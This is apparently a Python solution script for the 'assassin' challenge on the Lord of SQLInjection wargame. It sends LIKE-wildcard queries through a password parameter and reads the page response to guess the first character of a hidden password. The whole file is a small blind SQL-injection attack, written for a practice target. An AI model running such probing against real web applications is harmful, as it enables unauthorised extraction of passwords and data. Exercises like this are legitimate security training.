import urllib3
import requests


url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력
Answer = []

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

for i in ch:
    query = i + "%"
    req = requests.get(url+query, headers=header)
    print(url+query)

    if i != '%' and i != '_':
        if 'Hello guest' in req.text:
            Answer.append(i)
            break
        else:
            pass

print('[=] Find Init Words : ', Answer)
